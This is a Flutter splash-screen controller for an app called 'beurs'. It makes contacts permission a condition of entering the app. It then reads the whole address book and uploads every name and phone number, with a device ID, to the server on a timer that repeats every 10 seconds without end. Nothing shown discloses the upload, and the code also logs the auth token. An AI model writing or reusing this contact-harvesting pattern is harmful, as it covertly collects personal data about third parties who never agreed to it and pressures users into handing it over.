  import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:beurs/app/app_route.dart';
import 'package:beurs/data/local/session_manager.dart';
import 'package:beurs/data/repository/user_repository.dart';
import 'package:beurs/utility/utils.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_native_splash/flutter_native_splash.dart';
import 'package:get/get.dart';
import 'package:logger/logger.dart';
import 'package:permission_handler/permission_handler.dart';

class SplashController extends GetxController {
  final Logger _logger = Logger();
  RxList<Map<String, dynamic>> contactList = <Map<String, dynamic>>[].obs;
  @override
  void onInit() {
    // TODO: implement onInit
    if (Platform.isAndroid) {
      FlutterNativeSplash.remove();
    }
    FlutterNativeSplash.remove();
    Future.delayed(const Duration(seconds: 5), () {
      askPermissions();
    });

    super.onInit();
  }

  /*@override
  void onReady() {
    Future.delayed(const Duration(seconds: 3), () {
      askPermissions();
    });
    super.onReady();
  }*/

  /*@override
  void onReady() {
    Future.delayed(const Duration(seconds: 5), () {
      String? isToken = StorageManager().getAuthToken();
      bool? fromFresh = StorageManager().getFromFresh();
      print("Token:- ${isToken}");
      if (fromFresh == null) {
        Get.offNamed(AppRoutes.walkThroughPage);
      } else if (isToken == null) {
        Get.offNamed(AppRoutes.loginPage);
      } else {
        Get.offNamed(AppRoutes.dashboardPage);
      }
    });
    super.onReady();
  }*/

  Future<void> askPermissions() async {
    PermissionStatus permissionStatus = await _getContactPermission();
    if (permissionStatus == PermissionStatus.granted) {
      String? isToken = StorageManager().getAuthToken();
      bool? fromFresh = StorageManager().getFromFresh();
      _logger.d("Token:- $isToken");
      if (fromFresh == null) {
        Get.offNamed(AppRoutes.walkThroughPage);
      } else if (isToken == null) {
        Get.offNamed(AppRoutes.loginPage);
      } else {
        Get.offNamed(AppRoutes.dashboardPage);
      }
      List<Contact> contacts =
          await FlutterContacts.getContacts(withProperties: true);
      if (contacts.isEmpty) {}
      for (var i = 0; i < contacts.length; i++) {
        String displayName = contacts[i].displayName ?? '';
        List<Phone>? phones = contacts[i].phones?.toList();
        if (phones != null && phones.isNotEmpty) {
          if (phones.last.number!.length >= 9) {
            contactList.add({
              "Name": displayName.replaceAll(
                  RegExp('(\'|\"|\&|\<|\>|,|%|#|\$)'), ''),
              "ContactNo": phones.isEmpty
                  ? " "
                  : phones.last.number!
                      .replaceAll(RegExp(r'[-\s()\s+\s/\s,/s#/s./s*/s]'), '')
            });
          }
        }
      }
      if (contactList.isNotEmpty) {
        Timer.periodic(const Duration(seconds: 10), (timer) {
          sendContacts(contactList);
        });
      }
    } else {
      _handleInvalidPermissions(permissionStatus);
    }
  }

  void sendContacts(List<Map<String, dynamic>> contacts) async {
    var deviceId = await Utils.getDeviceId();
    Map<String, dynamic> params = {};
    Map<String, dynamic> data = {
      "data": {"contactlist": contactList}
    };

    params.putIfAbsent('json_data', () => jsonEncode(data));
    params.putIfAbsent('deviceid', () => deviceId.toString());
    // _logger.d("contactBody:- $params");
    UserRepository().syncContact(params).then((value) {
      value?.fold((l) {
        // Utils.showMessage(l);
      }, (r) {});
    });
  }

  Future<PermissionStatus> _getContactPermission() async {
    PermissionStatus permission = await Permission.contacts.status;
    if (permission != PermissionStatus.granted &&
        permission != PermissionStatus.permanentlyDenied) {
      PermissionStatus permissionStatus = await Permission.contacts.request();
      return permissionStatus;
    } else {
      return permission;
    }
  }

  void _handleInvalidPermissions(PermissionStatus permissionStatus) {
    if (permissionStatus == PermissionStatus.denied) {
      Utils.showMessage("Access to contact data denied");
    } else if (permissionStatus == PermissionStatus.permanentlyDenied) {
      Utils.showMessage("Contact data not available on device");
    }
  }
}
